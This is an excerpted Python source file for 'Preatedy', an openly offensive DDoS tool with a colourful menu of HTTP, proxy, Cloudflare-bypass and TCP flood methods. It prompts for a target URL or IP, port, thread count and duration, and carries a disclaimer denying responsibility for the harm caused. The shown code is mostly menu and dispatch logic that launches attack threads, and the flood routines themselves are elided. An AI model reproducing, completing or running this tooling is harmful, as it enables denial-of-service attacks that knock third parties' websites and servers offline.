...
def get_info_l7():
    clr()
    stdout.write(Colorate.Vertical(Colors.blue_to_green,"|   URL TARGET@preatedy ~>  ",  ))
    target = input()
    stdout.write(Colorate.Vertical(Colors.blue_to_green,"|   PORT@preatedy ~>  ", ))
    port = input()
    stdout.write(Colorate.Vertical(Colors.blue_to_green,"|   THREADS@preatedy ~>  ", ))
    thread = input()
    stdout.write(Colorate.Vertical(Colors.blue_to_green,"|   TIME@preatedy ~>  ", ))
    t = input()
    return target, thread, t
def get_info_l4():
    stdout.write(Colorate.Vertical(Colors.blue_to_green,"|   IP TARGET@preatedy ~>  ", ))
    target = input()
    stdout.write(Colorate.Vertical(Colors.blue_to_green,"|   PORT@preatedy ~>  ", ))
    port = input()
    stdout.write(Colorate.Vertical(Colors.blue_to_green,"|   THREADS@preatedy ~>  ", ))
...
def tcpcustom(target, port, method, time):
    os.system(f"tc.exe {target} {port} {method} {time}")
...
def inputf():
    printf(Colorate.Horizontal(Colors.blue_to_green,"""
    ThanhDat@PreaTedy⟿: """,True), end=' ')
...
def welcome():
  ...
  printf(Center.XCenter(Colorate.Vertical(Colors.purple_to_red, '''
          ...
          #########.
         #######*##*                        
        #########*###                        >> Press 'run' to enter the Preatedy Menu !
       ##########*  *##                      >> Press 'info' to view admin information !
      ###########    *                       >> Press 'guide' to see detailed tools in the Preatedy Menu !
    ############
    ##*#########
   ##   ########
          #######
            ######
             #####*
              ####*
                ####
                  ##*                        Copyright: Nguyen Thanh Dat
                    ##               [!!!]  Chúng tôi không chịu trách nhiệm cho những gì bạn gây ra !
                     ##.             [!!!]  We are not responsible for what you cause !
                    #####.
                  ##########
                 ####*  *####
  ...
  while Dat:
    ...
    if 'exit' in cmdl:
      ...
      printf(Colorate.Horizontal(Colors.purple_to_red, f"""
                      {random.choice(wms)}
      ...
      ╔════╦═════╩═══════════════════════════════╩═════╦═══╗
                          LIST - LAYER7
          ╔╩═══════════════════════════════════════════╩╗  
          |    HTTP     |     HTTP2     |   REQUESTCF   |
          |═════════════ ═══════════════ ═══════════════|
          |   PROXYAT2  |     METHOD    |   GETATTACK   |
          |═════════════ ═══════════════ ═══════════════|
          |  POSTATTACK |    BYPASSCF   |    HKATTACK   |
          |═════════════ ═══════════════ ═══════════════|
          |   PXSLOW    |   SOCATTACK   |     PXSOC     |
          |═════════════ ═══════════════ ═══════════════|
          |  SBYPASSCF  | PROXYATTACK2  |    METHOD2    |
         ╔╩═════════════════════════════════════════════╩╗
                         LIST - LAYER4
           ╩╦═════════════════════════════════════════╦╩
          
                             UPDATE
            Support contact: Nguyen Thanh Dat
                    facebook.com/preatedy
                      0338.368.207
      ╠═════════╦═════════════════════════════════╦═════════╣
      !!!!╦═════╩═════════════════════════════════╩══════╦!!!!
      """, True), end=' ')
      ...
      '''), True), end='')
    ...
    elif 'http' in cmdl or 'HTTP' in cmdl:
        ...
        if get_proxies():
            ...
            timer.join()
    elif "requestcf" in cmdl or 'REQUESTCF' in cmdl:
        target, thread, t = get_info_l7()
        ...
        timer.join()
    elif "proxyat2" in cmdl or 'PROXYGPAT2' in cmdl:
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSPOOF(target, thread, t)
        timer.join()
    elif "method2" in cmdl or "METHOD2" in cmdl:
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPXSPOOF(target, thread, t, get_proxylist("proxy.txt"))
        timer.join()
        time.sleep(1000)
    elif 'getattack' in cmdl or 'GETATTACK' in cmdl:
        target, thread, t = get_info_l7()
        threading.Thread(target=AttackRAW, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'postattack' in cmdl or 'POSTATTACK' in cmdl:
        target, thread, t = get_info_l7()
        threading.Thread(target=AttackPOST, args=(target, t, thread)).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif 'headattack' in cmdl or 'HEADATTACK' in cmdl:
        target, thread, t = get_info_l7()
    ...
    elif 'tcpcustom' in cmdl or 'TCPCUSTOM' in cmdl:
        target, port, thread, t = get_info_l4()
        tcpcustom(target, port, thread, t)

    elif 'proxyattack2' in cmdl or 'PROXYATTACK2' in cmdl:
        target, thread, t = get_info_l7()
        if get_proxies():
            ...
            timer.start()
            timer.join()
    elif 'socattack' in cmdl or 'PXSCREQUEST' in cmdl:
        target, thread, t = get_info_l7()
    ...
    elif 'sbypasscf' in cmdl or 'SBYPASSCF' in cmdl:
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            ...
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
    elif 'proxyat' in cmdl or 'PROXYAT' in cmdl:
        if get_proxies():
            target, thread, t = get_info_l7()
            ...
            timer.start()
            timer.join()
    elif 'method' in cmdl or 'METHOD' in cmdl:
        target, thread, t = get_info_l7()
    ...
    #####################################################################################
        ...
        timer.start()
        timer.join()
    elif 'hkattack' in cmdl or 'HKATTACK' in cmdl:
        target, thread, t = get_info_l7()
    ...
    elif 'bypasscf' in cmdl or 'BYPASSCF' in cmdl:
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            threading.Thread(target=AttackCFPRO, args=(target, t, thread)).start()
    ...
    ##################################################################################
      ...
      try:
        ...
        print((Colorate.Horizontal(Colors.red_to_purple, '    [!] Erorr, Please Try Again !!!')))
    ...
    def countdown(t):
        while True:
            ...
            stdout.write("   " + Fore.LIGHTBLUE_EX +"                ###*                  \n"+ Fore.RED)
            stdout.write("   " + Fore.LIGHTBLUE_EX +"               #####                  \n"+ Fore.RED)
            stdout.write("   " + Fore.LIGHTBLUE_EX +"              ##██##                    "+ Fore.RED +"                        PREATEDY ATTACK...                                  \n"+ Fore.GREEN)             
            stdout.write("   " + Fore.LIGHTBLUE_EX +"            #######                     "+ Fore.RED +"   ╔═════════╩═══╦═════════════════════════════╩═════════╗                  \n"+ Fore.GREEN)
            stdout.write("   " + Fore.LIGHTBLUE_EX +"           ########.                    "+ Fore.RED +"       METHODS   ║ " + cmdl                                                    + Fore.GREEN + "\n")
            stdout.write("   " + Fore.LIGHTBLUE_EX +"          #########.                    "+ Fore.RED +"   ╚═════════════╩═══════════════════════════════════════╝                  \n"+ Fore.GREEN)
            stdout.write("   " + Fore.LIGHTBLUE_EX +"         #######*##*                    "+ Fore.RED +"   ╔═════════════╦═══════════════════════════════════════╗                  \n"+ Fore.GREEN)
            stdout.write("   " + Fore.LIGHTBLUE_EX +"        #########*###                   "+ Fore.RED +"     URL TARGET  ║ " + target                                                  + Fore.GREEN + "\n")
            stdout.write("   " + Fore.LIGHTBLUE_EX +"       ##########*  *##                 "+ Fore.RED +"   ╚═════════════╩═══════════════════════════════════════╝                  \n"+ Fore.GREEN)
            stdout.write("   " + Fore.LIGHTBLUE_EX +"      ###########    *                  "+ Fore.RED +"   ╔═════════════╦═══════════════════════════════════════╗                  \n"+ Fore.GREEN)
            stdout.write("   " + Fore.LIGHTBLUE_EX +"    ############                        "+ Fore.RED +"       THREADS   ║ " + thread                                                  + Fore.GREEN + "\n")
            stdout.write("   " + Fore.LIGHTBLUE_EX +"    ##*#########                        "+ Fore.RED +"   ╚═════════════╩═══════════════════════════════════════╝                  \n"+ Fore.GREEN)
            stdout.write("   " + Fore.LIGHTBLUE_EX +"   ##   ########                        "+ Fore.RED +"   ╔═════════════╦═══════════════════════════════════════╗                  \n"+ Fore.GREEN)
            stdout.write("   " + Fore.LIGHTBLUE_EX +"          #######                       "+ Fore.RED +"        TIME     ║ " + t                                                       + Fore.GREEN + "\n")
            stdout.write("   " + Fore.LIGHTBLUE_EX +"            ######                      "+ Fore.RED +"   ╚═════════════╩═══════════════════════════════════════╝                  \n"+ Fore.GREEN)
            stdout.write("   " + Fore.LIGHTBLUE_EX +"             #####*                     "+ Fore.RED +"   ╠═════════╦═════════════════════════════════╦═════════╣                  \n"+ Fore.GREEN)
            stdout.write("   " + Fore.LIGHTBLUE_EX +"              ####*                     "+ Fore.RED +"          ╦══╩═════════════════════════════════╩══╦                         \n"+ Fore.GREEN)
            stdout.write("   " + Fore.LIGHTBLUE_EX +"                ####                  \n"+ Fore.RED)
...
if __name__ == '__main__':
    ...
    if len(sys.argv) < 2:
        ...
        stdout.write(
            "Method: http, http2, tcpcustom, requestcf, sbypasscf, bypasscf, hkattack, pxslow, bypass, stellar, requestcf, proxyat2, method2, getattack, postattack, headattack, proxyattack2, socattack, pxsoc\n")
    ...
    if method == "http":
        ...
        timer.join()
    elif method == "postattack":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPOST(target, thread, t)
        timer.join()
    elif method == "headattack":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHEAD(target, thread, t)
        timer.join()
    elif method == "proxyattack2":
        if get_proxies():
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXRAW(target, thread, t)
            timer.join()
    elif method == "socattack":
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        ...
        stdout.write(
            "No method found.\nMethod: http, http2, requestcf, proxyat2, method2, getattack, postattack, headattack, proxyattack2, socattack, pxsoc,  tcpcustom, requestcf, sbypasscf, bypasscf, hkattack, pxslow, bypass, stellar\n")
